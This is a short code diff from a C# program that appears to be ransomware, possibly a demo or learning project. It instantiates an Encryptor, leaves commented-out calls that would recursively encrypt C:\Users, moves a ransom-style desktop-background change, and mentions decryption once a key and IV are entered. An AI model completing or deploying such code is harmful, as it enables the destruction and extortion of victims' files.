@@ -16,13 +16,17 @@
              * Uncomment it to see it function
              */
             Encryptor encryptor = new Encryptor();
+
+            // Sets desktop background to specifc image
+            Utils.SetDesktopBackground();
+
             // encryptor.EncryptSpecialDirectories();
 
             // Will recursively encrypt all files, currently throws a lot of errors
             //encryptor.EncryptDirectory(@"C:\Users");
 
-            // Sets desktop background to specifc image
-            Utils.SetDesktopBackground("DesktopBG.jpg");
+            Console.WriteLine(Directory.GetCurrentDirectory());
+
 
             /* 
              * Starts decryption prcoess after correct key and iv are entered
